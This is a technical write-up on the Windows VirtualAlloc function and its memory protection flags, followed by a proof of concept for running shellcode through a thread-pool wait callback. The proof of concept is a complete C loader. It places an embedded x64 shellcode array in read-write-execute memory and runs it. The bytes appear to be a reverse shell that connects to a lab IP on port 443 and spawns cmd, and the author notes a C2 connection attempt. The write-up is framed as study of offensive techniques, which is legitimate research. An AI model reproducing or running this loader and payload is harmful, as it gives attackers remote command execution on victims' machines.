# Description

**`VirtualAlloc`** is a function that is used to allocate memory in the virtual address space of the calling process. It's a function that provides control over how memory is managed, including the size of the memory block, the memory allocation type, and the memory protection options.

```
LPVOID VirtualAlloc(
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);
```

The **`flProtect`** parameter represents the memory protection for the region of pages to be allocated. Here are the common values:

- **`PAGE_READONLY (0x2)`** Enables read-only access to the committed region of pages.
- **`PAGE_READWRITE (0x4)`** Enables both read and write access to the committed region of pages.
- **`PAGE_WRITECOPY (0x8)`** Enables write-copy access to the committed region of pages.
- **`PAGE_EXECUTE (0x10)`** Enables execute access to the committed region of pages.
- **`PAGE_EXECUTE_READ (0x20)`** Enables execute and read access to the committed region of pages.
- **`PAGE_EXECUTE_READWRITE (0x40)`** Enables execute, read, and write access to the committed region of pages.
- **`PAGE_EXECUTE_WRITECOPY (0x80)`** Enables execute and write-copy access to the committed region of pages.

**`PAGE_EXECUTE_READWRITE`** allows allocated memory pages to be both executable and writable. This level of access enables code to be both written to and executed from the same memory region, which is why it is considered unsafe and dangerous.

# Proof of Concept

All the credits are going to: https://www.ired.team/offensive-security/code-injection-process-injection/shellcode-execution-via-createthreadpoolwait - However, I've decided to tweak a little bit the code and wanted to explain it more for myself.

The code snippet allocates memory, load it with shellcode, and execute the shellcode. It uses **`VirtualAlloc`** to store the shellcode. The protection attribute **`PAGE_EXECUTE_READWRITE`** allows the memory to be executable and writable, which is necessary for shellcode execution. The **`RtlMoveMemory`** function copies the shellcode from the array into the allocated memory. 

It then uses **`CreateThreadpoolWait`** to create a thread pool, which is an object that represents a wait operation on a synchronization object, like an event or a semaphore. It then waits until the event has been signaled. When the event is signaled, the thread pool executes the shellcode. 



```c
#include <windows.h>
#include <threadpoolapiset.h>

unsigned char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00"
"\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\xc0\xa8\x38\x66\x41\x54"
"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c"
"\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff"
"\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2"
"\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48"
"\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99"
"\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x49\xb8\x63"
"\x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89\xe2\x57"
"\x57\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44"
"\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6"
"\x56\x50\x41\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff"
"\xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5"
"\x48\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
"\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
"\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";


int main() {
    // Create an auto-reset event that starts in the non-signaled state.
    HANDLE event = CreateEvent(NULL, FALSE, FALSE, NULL);
    if (event == NULL) {
        MessageBox(NULL, L"Failed to create event.", L"Error", MB_OK);
        return 1;
    }

    // Allocate a region of memory to hold the shellcode, making it executable.
    LPVOID shellcodeAddress = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (shellcodeAddress == NULL) {
        MessageBox(NULL, L"Failed to allocate memory for shellcode.", L"Error", MB_OK);
        CloseHandle(event);
        return 1;
    }

    // Copy the shellcode to the allocated executable memory.
    RtlMoveMemory(shellcodeAddress, shellcode, sizeof(shellcode));

    // Create a thread pool wait object that will execute the shellcode when the event is signaled.
    PTP_WAIT threadPoolWait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)shellcodeAddress, NULL, NULL);
    if (threadPoolWait == NULL) {
        MessageBox(NULL, L"Failed to create thread pool wait.", L"Error", MB_OK);
        VirtualFree(shellcodeAddress, 0, MEM_RELEASE);
        CloseHandle(event);
        return 1;
    }

    // Set the thread pool to wait on the event handle. The shellcode will execute when the event is signaled.
    SetThreadpoolWait(threadPoolWait, event, NULL);

    // Signal the event to start execution of the shellcode.
    SetEvent(event);

    // Wait indefinitely for the shellcode to complete execution.
    WaitForSingleObject(event, INFINITE);

    // Cleanup resources.
    CloseThreadpoolWait(threadPoolWait);
    VirtualFree(shellcodeAddress, 0, MEM_RELEASE);
    CloseHandle(event);

    return 0;
}
```

This memory region contains shellcode and is marked as **RWX**, it suggests that the shellcode might be about to execute or is currently being executed:

![image](https://github.com/DebugPrivilege/WindowsAP1/assets/63166600/16cab883-c605-497d-a830-165e1557841b)


Here is a screenshot of the shellcode attempting to establish a C2 connection:

![image](https://github.com/DebugPrivilege/WindowsAP1/assets/63166600/20168435-4d0e-4c65-9703-ad0c8def42f9)


